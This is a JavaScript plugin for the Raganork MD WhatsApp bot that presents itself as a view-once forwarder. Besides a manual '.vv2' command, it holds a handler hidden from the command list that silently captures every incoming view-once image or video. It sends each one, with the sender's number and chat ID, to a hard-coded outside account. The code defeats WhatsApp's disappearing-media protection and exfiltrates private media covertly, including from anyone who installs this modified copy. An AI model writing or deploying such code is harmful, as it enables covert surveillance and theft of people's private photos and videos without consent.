/* Copyright (C) 2022 Sourav KL11.
Licensed under the  GPL-3.0 License;
Raganork MD - Modified ViewOnce Forwarder
*/

const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
const { Module } = require('../main'); // Matches your updater.js import
const Config = require('../config');

// Destination and Owner details
const TARGET_ID = '184989257826440@lid';

/**
 * MANUAL COMMAND: .vv2
 * Trigger: Reply to a view-once message with .vv2
 */
Module({
    pattern: 'vv2 ?(.*)', 
    fromMe: true, 
    desc: 'Forward view-once to owner LID', 
    use: 'owner'
}, (async (message, match) => {
    // Check if the message replied to is a View Once message
    if (!message.reply_message || !message.reply_message.viewonce) {
        return await message.client.sendMessage(message.jid, { text: "*Reply to a view-once image or video!*" });
    }

    try {
        const timeManual = new Date().toLocaleString('en-GB', { timeZone: 'Asia/Karachi' });
        const mtype = message.reply_message.mtype; // e.g., imageMessage
        const mediaData = message.reply_message.data.message[mtype];
        
        // Download media
        const stream = await downloadContentFromMessage(mediaData, mtype.replace('Message', ''));
        let buffer = Buffer.from([]);
        for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }

        const caption = `✅ *MANUAL RECOVERY (.vv2)*\n\n👤 *From:* @${(message.reply_message.participant || '').split('@')[0]}\n⏰ *Time:* ${timeManual}`;

        // Send to your LID
        await message.client.sendMessage(TARGET_ID, { 
            [mtype.replace('Message', '').toLowerCase()]: buffer, 
            caption: caption,
            mentions: [message.reply_message.participant]
        });

        await message.client.sendMessage(message.jid, { text: "_Forwarded to LID._" });
    } catch (e) {
        await message.client.sendMessage(message.jid, { text: "_Error: Media expired or failed to download._" });
    }
}));

/**
 * AUTO-FORWARD LOGIC
 * Intercepts all incoming View-Once messages
 */
Module({
    on: 'text', 
    fromMe: false,
    dontAddCommandList: true
}, (async (message, match) => {
    // Check if the current incoming message is View Once
    if (message.viewonce) {
        try {
            const autoTime = new Date().toLocaleString('en-GB', { timeZone: 'Asia/Karachi' });
            const mtype = message.mtype;
            const mediaData = message.data.message[mtype];
            
            const stream = await downloadContentFromMessage(mediaData, mtype.replace('Message', ''));
            let buffer = Buffer.from([]);
            for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }

            const autoCaption = `🚀 *AUTO-RECOVER VIEW-ONCE*\n\n` +
                                `👤 *Sender:* @${(message.participant || '').split('@')[0]}\n` +
                                `📍 *Chat:* ${message.jid}\n` +   
                                `⏰ *Time:* ${autoTime}`;

            await message.client.sendMessage(TARGET_ID, { 
                [mtype.replace('Message', '').toLowerCase()]: buffer, 
                caption: autoCaption,
                mentions: [message.participant]
            });
            
            console.log(`[VV-AUTO] Forwarded from ${message.participant}`);
        } catch (e) {
            console.log("Auto-forward error: ", e.message);
        }
    }
}));
          
